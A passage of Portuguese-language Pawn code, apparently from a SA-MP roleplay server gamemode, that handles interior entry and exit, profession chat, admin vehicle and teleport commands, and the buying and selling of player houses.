		    SetPlayerPos(playerid, -2026.8789, -103.6022, 1035.1833);
		    SetPlayerInterior(playerid, 3);
		    pInfo[playerid][entrouHAB] = 1;
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, -2026.6133, -100.9539, 35.1641)) // Auto Escola SF
		{
		    SetPlayerPos(playerid, -2026.8789, -103.6022, 1035.1833);
		    SetPlayerInterior(playerid, 3);
		    pInfo[playerid][entrouHAB] = 2;
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1352.4087, -1759.2499, 13.5078)) // 24/7
		{
		    SetPlayerPos(playerid, -25.8498, -188.2523, 1003.5469);
		    SetPlayerInterior(playerid, 17);
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1169.9524, -1489.6898, 22.7558)) // 24/7²
		{
		    SetPlayerPos(playerid, -25.8498, -188.2523, 1003.5469);
		    SetPlayerInterior(playerid, 17);
		    SetPlayerVirtualWorld(playerid, 24);
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1631.8516, -1172.9270, 24.0843)) // Loterica
		{
		    SetPlayerPos(playerid, -2158.6572, 643.1335, 1052.3750);
		    SetPlayerInterior(playerid, 1);
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 625.7263, -2244.6213, 13.1349)) // Cruzeiro LS
		{
		    SetPlayerPos(playerid, 1100.1354, 243.8890, 527.3731+1);
		    SetPlayerInterior(playerid, 0);
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 2229.8167, -1721.1733, 13.5603)) // Academia
		{
		    SetPlayerPos(playerid, 773.9420, -78.8449, 1000.6628);
		    SetPlayerInterior(playerid, 7);
            pInfo[playerid][EntrouL] = true;
            SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 2421.6262, -1219.2485, 25.5610)) // Puteiro
		{
		    SetPlayerPos(playerid, 1204.7864, -13.8520, 1000.9219);
		    SetPlayerInterior(playerid, 2);
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 2310.1558, -1643.6486, 14.8270)) // Bar da Grove
		{
		    SetPlayerPos(playerid, 501.9589, -67.5634, 998.7578);
		    SetPlayerInterior(playerid, 11);
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 2105.4834, -1806.5027, 13.554)) // Pizzaria
		{
		    SetPlayerPos(playerid, 372.2989, -133.5238, 1001.4922);
		    SetPlayerInterior(playerid, 5);
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1199.2562, -918.1423, 43.1232)) // Burger Shot
		{
		    SetPlayerPos(playerid, 362.7990, -75.0967, 1001.5078);
		    SetPlayerInterior(playerid, 10);
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 928.9155, -1352.9719, 13.3438)) // Cluckin'Bell
		{
		    SetPlayerPos(playerid, 365.0023, -11.8438, 1001.8516);
		    SetPlayerInterior(playerid, 9);
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1481.0233,-1771.7765,18.7957)) // Prefeitura LS
		{
		    SetPlayerPos(playerid, 380.0053, 173.6629, 1008.3828);
			SetPlayerFacingAngle(playerid, 92.4343);
		    SetPlayerInterior(playerid, 3);
		    pInfo[playerid][entroupref] = 1;
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, -2765.3511, 375.5041, 6.3359)) // Prefeitura SF
		{
		    SetPlayerPos(playerid, 380.0053, 173.6629, 1008.3828);
			SetPlayerFacingAngle(playerid, 92.4343);
		    SetPlayerInterior(playerid, 3);
		    pInfo[playerid][entroupref] = 2;
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1367.1837, -1279.7854, 13.5469)) // Ammuu
		{
			SetPlayerPos(playerid, 314.820983,-141.431991,999.601562);
			SetPlayerInterior(playerid, 7);
		    pInfo[playerid][EntrouL] = true;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 328.5529,-1513.7094,36.0391)) // Hotel LS
		{
			SetPlayerPos(playerid, 2216.3999023438,-1150.5999755859,1025.8000488281);
			SetPlayerInterior(playerid, 15);
			pInfo[playerid][EntrouL] = true;
			SetCameraBehindPlayer(playerid);
			return 1;
		}
		return 1;
	}
	if(!strcmp(cmd, "/sair", true))
	{
		if(IsPlayerInRangeOfPoint(playerid, 2.0, 246.8718, 62.3202, 1003.6406)) // Delegacia
		{
		    if(pInfo[playerid][entrouDEL] == 2) // SF
		    {
			    SetPlayerPos(playerid, -1606.0313, 717.9035, 12.0699);
			    SetPlayerFacingAngle(playerid, 359.8679);
			    SetPlayerInterior(playerid, 0);
			    SetPlayerVirtualWorld(playerid, 0);
			    GameTextForPlayer(playerid, "~w~San Fierro", 3000, 1);
		    }
		    pInfo[playerid][entrouDEL] = 0;
		    pInfo[playerid][EntrouL] = false;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0,1560.7961,-1675.6205,16.2505))
		{
	    	SetPlayerPos(playerid, 1553.2599,-1675.5905,16.1953);
	    	SetPlayerFacingAngle(playerid, 89.4814);
		    SetPlayerInterior(playerid, 0);
		    GameTextForPlayer(playerid, "~w~Los Santos", 3000, 1);
		    pInfo[playerid][entrouDEL] = 0;
		    pInfo[playerid][EntrouL] = false;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0,493.4367, -24.9197, 1000.6719)) // Alhambra
		{
		    SetPlayerPos(playerid, 1836.5631, -1682.5184, 13.3427);
		    SetPlayerInterior(playerid, 0);
		    pInfo[playerid][EntrouL] = false;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1578.8885,-1663.0897,2.0466)) // Para o pátio
		{
		    SetPlayerPos(playerid, 1551.5126,-1616.4089,13.3828);
		    SetPlayerFacingAngle(playerid,358.0025);
		    SetPlayerInterior(playerid, 0);
		    GameTextForPlayer(playerid, "~w~Patio", 3000, 1);
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 1.0, 2235.7280,-1334.2772,24.0924))
		{
		    SetPlayerPos(playerid, 2232.8218,-1333.2921,23.9816);
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 246.4077, 107.6076, 1003.2188)) // Agência
		{
			if(pInfo[playerid][EntrouAgencia] == 1)
		    {
			    SetPlayerPos(playerid, 1310.3708,-1370.8752,13.5204); // LS
			    SetPlayerFacingAngle(playerid, 181.6691);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    pInfo[playerid][EntrouAgencia] = 0;
			    GameTextForPlayer(playerid, "~w~Los Santos", 3000, 1);
		    }
		    else if(pInfo[playerid][EntrouAgencia] == 2)
		    {
			    //SetPlayerPos(playerid, -2650.2886, 376.0364, 6.1563); // SF
			    SetPlayerPos(playerid, -2227.2854, 251.9700, 35.3203);
			    SetPlayerFacingAngle(playerid, 317.8766);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    pInfo[playerid][EntrouAgencia] = 0;
			    GameTextForPlayer(playerid, "~w~San Fierro", 3000, 1);
		    }
		    else if(pInfo[playerid][EntrouAgencia] == 3)
		    {
			    SetPlayerPos(playerid, 1952.8214, 1342.8403, 15.3672); // LV
			    SetPlayerFacingAngle(playerid, 269.9011);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    pInfo[playerid][EntrouAgencia] = 0;
			    GameTextForPlayer(playerid, "~w~Las Venturas", 3000, 1);
		    }
   		    else if(pInfo[playerid][EntrouAgencia] == 4)
		    {
			    SetPlayerPos(playerid, -206.9538,1119.1993,20.4297); // FC
			    SetPlayerFacingAngle(playerid, 140.0);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    pInfo[playerid][EntrouAgencia] = 0;
			    GameTextForPlayer(playerid, "~w~Fort Carson", 3000, 1);
		    }
      		else if(pInfo[playerid][EntrouAgencia] == 5)
		    {
			    SetPlayerPos(playerid, 207.8856, -62.8081, 1.5781); // Blueberry
			    SetPlayerFacingAngle(playerid, 180.0);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    pInfo[playerid][EntrouAgencia] = 0;
			    GameTextForPlayer(playerid, "~w~Blueberry", 3000, 1);
		    }
      		else if(pInfo[playerid][EntrouAgencia] == 6)
		    {
			    SetPlayerPos(playerid, 834.6674, 7.4959, 1004.1870); // Angel Pine
			    SetPlayerFacingAngle(playerid, 360.0);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    pInfo[playerid][EntrouAgencia] = 0;
			    GameTextForPlayer(playerid, "~w~Angel Pine", 3000, 1);
		    }
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1247.8998, -857.9455, 1086.4293)) // Banco
		{
            if(pInfo[playerid][EntrouAgencia] == 1)
		    {
			    SetPlayerPos(playerid, 2127.5425, 2378.9783, 10.8203);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    pInfo[playerid][EntrouAgencia] = 0;
			    GameTextForPlayer(playerid, "~w~Las Venturas", 3000, 1);
		    }
		    else if(pInfo[playerid][EntrouAgencia] == 2)
		    {
			    SetPlayerPos(playerid, -2425.3201, 337.5206, 37.0020);
			    SetPlayerFacingAngle(playerid, 87.8926);
			    SetPlayerInterior(playerid, 0);
			    pInfo[playerid][EntrouL] = false;
			    pInfo[playerid][EntrouAgencia] = 0;
			    GameTextForPlayer(playerid, "~w~San Fierro", 3000, 1);
		    }
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, -2026.8789, -103.6022, 1035.1833)) // Auto Escola
		{
		    if(pInfo[playerid][entrouHAB] == 1)
		    {
			    SetPlayerPos(playerid, 1657.9943, -1343.3003, 17.4365); // LS
			    SetPlayerInterior(playerid, 0);
			    GameTextForPlayer(playerid, "~w~Los Santos", 3000, 1);
		    }
		    if(pInfo[playerid][entrouHAB] == 2)
		    {
			    SetPlayerPos(playerid, -2026.6133, -100.9539, 35.1641); // SF
			    SetPlayerFacingAngle(playerid, 0.2082);
			    SetPlayerInterior(playerid, 0);
			    GameTextForPlayer(playerid, "~w~San Fierro", 3000, 1);
		    }
		    pInfo[playerid][EntrouL] = false;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, -25.8498, -188.2523, 1003.5469)) // 24/7 e 24/7²
		{
		    if(GetPlayerVirtualWorld(playerid) == 24)
		    {
		    	SetPlayerPos(playerid, 1169.9524, -1489.6898, 22.7558);
		    	SetPlayerInterior(playerid, 0);
		    	SetPlayerVirtualWorld(playerid, 0);
		    	pInfo[playerid][EntrouL] = false;
		    }
		    else if(GetPlayerVirtualWorld(playerid) == 0)
		    {
		    	SetPlayerPos(playerid, 1352.4087, -1759.2499, 13.5078);
		    	SetPlayerInterior(playerid, 0);
		    	pInfo[playerid][EntrouL] = false;
		    }
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, -2158.6572, 643.1335, 1052.3750)) // Loterica
		{
		    SetPlayerPos(playerid, 1631.8516, -1172.9270, 24.0843);
		    SetPlayerInterior(playerid, 0);
		    pInfo[playerid][EntrouL] = false;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1100.1354, 243.8890, 527.3731)) // Cruzeiro LS
		{
		    SetPlayerPos(playerid, 625.7263, -2244.6213, 13.1349);
		    SetPlayerInterior(playerid, 0);
		    pInfo[playerid][EntrouL] = false;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 773.9420, -78.8449, 1000.6628)) // Academia
		{
		    SetPlayerPos(playerid, 2229.8167, -1721.1733, 13.5603);
		    SetPlayerInterior(playerid, 0);
            pInfo[playerid][EntrouL] = false;
            SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 1204.7864, -13.8520, 1000.9219)) // Puteiro
		{
		    SetPlayerPos(playerid, 2421.6262, -1219.2485, 25.5610);
		    SetPlayerInterior(playerid, 0);
		    pInfo[playerid][EntrouL] = false;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 501.9589, -67.5634, 998.7578)) // Bar da Grove
		{
		    SetPlayerPos(playerid, 2310.1558, -1643.6486, 14.8270);
		    SetPlayerInterior(playerid, 0);
		    pInfo[playerid][EntrouL] = false;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 372.2989, -133.5238, 1001.4922)) // Pizzaria
		{
		    SetPlayerPos(playerid, 2105.4834, -1806.5027, 13.554);
		    SetPlayerInterior(playerid, 0);
		    pInfo[playerid][EntrouL] = false;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 362.7990, -75.0967, 1001.5078)) // Burger Shot
		{
		    SetPlayerPos(playerid, 1199.2562, -918.1423, 43.1232);
		    SetPlayerInterior(playerid, 0);
		    pInfo[playerid][EntrouL] = false;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 365.0023, -11.8438, 1001.8516)) // Cluckin'Bell
		{
		    SetPlayerPos(playerid, 928.9155, -1352.9719, 13.3438);
		    SetPlayerInterior(playerid, 0);
            pInfo[playerid][EntrouL] = false;
            SetCameraBehindPlayer(playerid);
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 390.0609, 173.7708, 1008.3828)) // Prefeitura
		{
		    if(pInfo[playerid][entroupref] == 1)
		    {
			    SetPlayerPos(playerid, 1481.0233,-1771.7765,18.7957); // LS
			    SetPlayerFacingAngle(playerid, 358.2239);
			    SetPlayerInterior(playerid, 0);
	            pInfo[playerid][EntrouL] = false;
	            SetCameraBehindPlayer(playerid);
	            GameTextForPlayer(playerid, "~w~Los Santos", 3000, 1);
            }
            if(pInfo[playerid][entroupref] == 2)
			{
				SetPlayerPos(playerid, -2763.0068, 375.6516, 5.8614); // SF
				SetPlayerFacingAngle(playerid, 269.5799);
				SetPlayerInterior(playerid, 0);
				pInfo[playerid][EntrouL] = false;
				SetCameraBehindPlayer(playerid);
				GameTextForPlayer(playerid, "~w~San Fierro", 3000, 1);
			}
            pInfo[playerid][entroupref] = 0;
		    return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 314.820983,-141.431991,999.601562)) // Ammu
		{
		    SetPlayerPos(playerid, 1367.1837, -1279.7854, 13.5469);
		    SetPlayerInterior(playerid, 0);
            pInfo[playerid][EntrouL] = false;
            SetCameraBehindPlayer(playerid);
			return 1;
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, 2214.6999511719,-1150.5999755859,1025.8000488281)) // Hotel LS
		{
			SetPlayerPos(playerid, 330.6975,-1515.4447,35.8672);
			SetPlayerInterior(playerid, 0);
			pInfo[playerid][EntrouL] = false;
			SetCameraBehindPlayer(playerid);
			return 1;
		}
		return 1;
	}
	if(strcmp(cmd, "/CP", true) == 0)
	{
	    strmid(tmp, cmdtext, 3, strlen(cmdtext));
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, COR_ERRO, "Uso válido: /CP [Texto]");
	    	return 1;
		}
		else
		{
            foreach(Player, i)
            {
		 		if(pInfo[i][Prof] == pInfo[playerid][Prof])
				{
					format(gstring, sizeof(gstring), "(C/P) '%s' diz: %s", PlayerName(playerid), tmp);
					SendClientMessage(i, GetPlayerColor(playerid), gstring);
				}
			}
		}
	    return 1;
	}
	if(!strcmp(cmd, "/profissao", true))
	{
	    ComandosProf(playerid);
		return 1;
	}
	if(!strcmp(cmd, "/setarveiculo", true) || !strcmp(cmd, "/setcar", true))
	{
		if(aInfo[playerid][Admin] == 1)
		{
			new
				settmp[256],
				dono,
				carid,
				Float:ang,
				cor1,
				cor2
			;
			settmp = strtok(cmdtext, idx);
			if(!strlen(settmp))
			{
				SendClientMessage(playerid, COR_ERRO, "ID de veículo inválido, IDs entre 400 e 611!");
				return 1;
			}
			carid = strval(settmp);
			settmp = strtok(cmdtext, idx);
			if(!strlen(settmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: \"/SetarVeiculo [ID do véiculo] [ID do dono/setador] [Cor 1] [Cor 2]\".");
				return 1;
			}
    	 	dono = strval(settmp);
   	    	settmp = strtok(cmdtext, idx);
			if(!strlen(settmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: \"/SetarVeiculo [ID do véiculo] [ID do dono/setador] [Cor 1] [Cor 2]\".");
				return 1;
			}
			cor1 = strval(settmp);
   	    	settmp = strtok(cmdtext, idx);
			if(!strlen(settmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: \"/SetarVeiculo [ID do véiculo] [ID do dono/setador] [Cor 1] [Cor 2]\".");
				return 1;
			}
			cor2 = strval(settmp);
			if(carid >= 400 && carid <= 611)
			{
				if(IsPlayerConnected(dono))
				{
					if(WE_GetInt(f(playerid), "AdminL") == 0) return SendClientMessage(playerid, COR_ERRO, "Você não pode criar um Set!");
		    		if(IsPlayerInAnyVehicle(playerid))
					{
						new
							SetStr[256],
							File:fSet,
							Float:sp[3]
						;
						GetPlayerPos(playerid, sp[0], sp[1], sp[2]);
						GetVehicleZAngle(GetPlayerVehicleID(playerid), ang);
						format(SetStr, sizeof(SetStr), "%d %f %f %f %f %d %d // Criado por %s para O(A) jogador(a) %s\r\n", carid, sp[0], sp[1], sp[2], ang, cor1, cor2, PlayerName(playerid), PlayerName(dono));
						fSet = fopen("Sets.cfg", io_append);
	   	               	fwrite(fSet, SetStr);
    	   	           	fclose(fSet);
        	   	       	SendClientMessage(playerid, COR_MUSGO, "Veículo setado!");
           		       	SetTimerEx("CriarSet", 5000, false, "dffffdd", carid, sp[0], sp[1], sp[2], ang, cor1, cor2);
						SendClientFormat(dono, AZUL_WE, "O(A) administrador(a) %s setou um veículo para você!", PlayerName(playerid));
					}
					else
					{
					    SendClientMessage(playerid, COR_ERRO, "Você deve estar em um véiculo para criar um set.");
						return 1;
					}
				}
				else
				{
				    SendClientMessage(playerid, COR_ERRO, "O(A) jogador(a) para o qual você deseja criar o Set não está conectado!");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "ID de veículo inválido, id's entre 400 e 611!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COR_ERRO, "Você não é administrador!");
			return 1;
		}
		return 1;
	}
	if(!strcmp(cmd, "/pm", true) || !strcmp(cmd, "/mp", true))
	{
	    SendClientMessage(playerid, COR_ERRO, "Para enviar mensagem privada somente com um celular!");
	    SendClientMessage(playerid, COR_ERRO, "Caso precise de ajuda use '/Duvida [Mensagem/Duvida]')");
		return 1;
	}
	if(!strcmp(cmd, "/ircasa", true))
    {
        if(aInfo[playerid][Admin] == 0)
			return SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp))
			return SendClientMessage(playerid, COR_ERRO, "Uso válido: /ircasa [Número]");
        new
			numero = strval(tmp)
		;
        format(hFile, sizeof(hFile), "Casas/casa%d.ini", numero);
        if(!fexist(hFile))
			return SendClientMessage(playerid, COR_ERRO, "Casa inexistente!");
        SetPlayerPos(playerid, WE_GetFloat(hFile, "X"), WE_GetFloat(hFile, "Y"), WE_GetFloat(hFile, "Z"));
        SendClientFormat(playerid, 0x00EA3AAA, "Você se teleportou até a casa número %d que pertence a %s.", numero, WE_GetString(hFile, "Proprietario"));
        return 1;
    }
   	if(!strcmp(cmd, "/irempresa", true))
    {
        if(aInfo[playerid][Admin] == 0)
			return SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp))
			return SendClientMessage(playerid, COR_ERRO, "Uso válido: /irempresa [Número]");
        new
			numero = strval(tmp)
		;
        format(hFile, sizeof(hFile), "Empresas/Empresa%d.ini", numero);
        if(!fexist(hFile))
			return SendClientMessage(playerid, COR_ERRO, "Empresa inexistente!");
        SetPlayerPos(playerid, EmpresaInfo[numero][PickupX], EmpresaInfo[numero][PickupY], EmpresaInfo[numero][PickupZ]);
        SendClientFormat(playerid, 0x00EA3AAA, "Você se teleportou até a empresa número %d", numero);
        return 1;
    }
	if(!strcmp(cmd, "/casa", true))
	{
 		Tempo[playerid] = gettime();
		if(Tempo[playerid] - HousePickup[playerid] > 5)
		{
    		SendClientMessage(playerid, COR_ERRO, "Você não está em uma casa!");
    		return 1;
		}
 		tmp = strtok(cmdtext, idx);
   		if(!strlen(tmp))
     	{
     	    SendClientMessage(playerid, AZUL_WE, "Utilize o '/Casa Comandos' para certificar-se o resultado de cada comando abaixo.");
	    	SendClientMessage(playerid, VERMELHO_WE, "Use: /Casa [Info, Comprar, Vender, Aceitar, Oferecer, Remover, Morador, Fechar, Abrir]");
	    	return 1;
      	}
       	else if(!strcmp(tmp, "comandos", true))
        {
            for(new c; c < MAX_CASAS; ++c)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
			    {
       				if(strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
		   			{
		   			    SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
					   	return 1;
					}
			    	new
						dStr[1500],
					    acCMDS[] = "{1BBD62}/Casa Abrir {FFFFFF}- Abre a casa.\n{1BBD62}/Casa Fechar {FFFFFF}- Fecha a casa.\n{1BBD62}/Casa Morador {FFFFFF}- Adiciona um morador.\n{1BBD62}/Casa Remover {FFFFFF}- Remove um morador.\n",
						bcCMDS[] = "{1BBD62}/Casa Mensagem {FFFFFF}- Adiciona uma mensagem na casa.\n{1BBD62}/Casa Oferecer {FFFFFF}- Oferece a casa para alguém.\n{1BBD62}/Casa Aceitar {FFFFFF}- Aceita uma casa oferecida.\n",
						ccCMDS[] = "{1BBD62}/Casa Vender {FFFFFF}- Vende a casa.\n{1BBD62}/Casa Comprar {FFFFFF}- Compra a casa.\n{1BBD62}/Casa Info {FFFFFF}- Mostra as informações da casa.\n"
					;
				    format(dStr, sizeof(dStr), "%s%s%s", acCMDS, bcCMDS, ccCMDS);
					ShowPlayerDialog(playerid, 5244, DIALOG_STYLE_MSGBOX, "{FF0000}{1E90FF} Casa Comandos:", dStr, "Fechar", "");
                   	return 1;
				}
			}
			return 1;
   		}
       	else if(!strcmp(tmp, "comprar", true))
        {
            for(new c; c < MAX_CASAS; ++c)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
				{
					if(!strcmp(CasaInfo[c][Proprietario], PlayerName(playerid), false))
					{
					    SendClientMessage(playerid, COR_ERRO, "Essa casa já é sua!");
						return 1;
					}
					if(strcmp(CasaInfo[c][Proprietario], "Ninguem", false))
					{
					    SendClientMessage(playerid, COR_ERRO, "Essa casa já tem dono!");
						return 1;
					}
					new
						CasaID = WE_GetInt(f(playerid), "Casa")
					;
					if(CasaID > 0)
					{
						if(!strcmp(CasaInfo[CasaID][Proprietario], PlayerName(playerid), false))
						{
						    SendClientMessage(playerid, COR_ERRO, "Você já é dono(a) de uma casa!");
						    return 1;
						}
						else if(strcmp(CasaInfo[CasaID][Proprietario], PlayerName(playerid), false))
						{
						    WE_SetInt(f(playerid), "Casa", -1);
						}
					}
					new
					    MorandoID = WE_GetInt(f(playerid), "MorandoID")
					;
					if(MorandoID > 0)
					{
   						if(!strcmp(CasaInfo[MorandoID][Morador], PlayerName(playerid), false) || !strcmp(CasaInfo[MorandoID][Morador2], PlayerName(playerid), false) || !strcmp(CasaInfo[MorandoID][Morador3], PlayerName(playerid), false))
						{
                            SendClientMessage(playerid, COR_ERRO, "Você é morador(a) de uma casa, antes de comprar essa casa você precisa revogar sua moradia!");
						    return 1;
						}
						else if(strcmp(CasaInfo[MorandoID][Morador], PlayerName(playerid), false) && strcmp(CasaInfo[MorandoID][Morador2], PlayerName(playerid), false) && strcmp(CasaInfo[MorandoID][Morador3], PlayerName(playerid), false))
						{
						    WE_SetInt(f(playerid), "MorandoID", -1);
						}
					}
			        if(GetPlayerCash(playerid) < CasaInfo[c][Preco])
					{
					    SendClientMessage(playerid, COR_ERRO, "Você não tem dinheiro suficiente!");
						return 1;
					}

    		 		format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);

					if(WE_GetInt(hFile, "Shopping") == 1)
					{
					    SendClientMessage(playerid, COR_ERRO, "Essa casa só pode ser comprada atraves do shopping!");
					    SendClientMessage(playerid, COR_ERRO, "Acesse nosso fórum e procure pelo shopping.");
					    return 1;
					}

					format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));

	   				new
						zone[MAX_ZONE_NAME]
					;
					GetPlayer2DZone(playerid, zone, MAX_ZONE_NAME);
					format(gstring, sizeof(gstring), "Casa ID {FFFFFF}%d{00B503}, localizada em {FFFFFF}%s{00B503}, comprada por {FFFFFF}%s", CasaInfo[c][Numero], zone, PlayerName(playerid));
					SendClientMessageToAll(0x00B503AA, gstring);
					WE_SetInt(gFile, "Casa", CasaInfo[c][Numero]);
					WE_SetInt(gFile, "Spawn", 1);
					WE_SetInt(gFile, "Impostos", 0);
            		WE_SetInt(gFile, "Atrasados", 0);
			        sGivePlayerCash(playerid, -CasaInfo[c][Preco]);
					DestroyPickup(CasaPickup[c]);
					CasaPickup[c] = CreatePickup(1272, 23, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]);
					WE_SetString(hFile, "Dono", "1");
					WE_SetString(hFile, "Proprietario", PlayerName(playerid));
					format(CasaInfo[c][Proprietario], 50, PlayerName(playerid));
   					format(CasaInfo[c][Morador], 64, "Ninguem");
					WE_SetString(hFile, "Morador", "Ninguem");
   					format(CasaInfo[c][Morador2], 64, "Ninguem");
					WE_SetString(hFile, "Morador2", "Ninguem");
					format(CasaInfo[c][Morador3], 64, "Ninguem");
					WE_SetString(hFile, "Morador3", "Ninguem");
   					CasaInfo[c][Status] = 0;
   					pInfo[playerid][Spawn] = 1;
   					LiberadoCasa[playerid] = 0;
					// -- Login
					WE_SetString(hFile, "Login", WE_GetString(gFile, "ulData"));
					format(CasaInfo[c][Login], 12, WE_GetString(gFile, "ulData"));
					WE_SetString(hFile, "Horario", Ghora());
					format(CasaInfo[c][Horario], 12, Ghora());
					new
						casacom[128]
					;
					format(casacom, sizeof(casacom), "%s comprou a casa %d | %s | %s", PlayerName(playerid), CasaInfo[c][Numero], Gdata(), Ghora());
					casaComprou(casacom);
					pInfo[playerid][Casa] = c;
					format(gStr, sizeof(gStr), "Casa {FFFFFF}ID %d {FFFFFF}- {FF0000}Possui dono(a)", CasaInfo[c][Numero]);
					Update3DTextLabelText(CasaLabel[c], COR_BRANCO, gStr);
			        return 1;
				}
            }
            return 1;
        }
        else if(!strcmp(tmp, "vender", true))
        {
        	for(new c; c < MAX_CASAS; ++c)
			{
			    if(IsPlayerInRangeOfPoint(playerid, 3.0, CasaInfo[c][PickupX], CasaInfo[c][PickupY], CasaInfo[c][PickupZ]))
			    {
			        format(hFile, sizeof(hFile), "Casas/casa%d.ini", CasaInfo[c][Numero]);
   					if(strcmp(WE_GetString(hFile, "Proprietario"), PlayerName(playerid), false))
					{
						SendClientMessage(playerid, COR_ERRO, "Você não é dono(a) desta casa!");
						return 1;
					}
					format(gFile, sizeof(gFile), "Contas/%s.ini", PlayerName(playerid));
   					sGivePlayerCash(playerid, CasaInfo[c][Preco] * 90 / 100);
	   				new
						zone[MAX_ZONE_NAME]
					;
					GetPlayer2DZone(playerid, zone, MAX_ZONE_NAME);
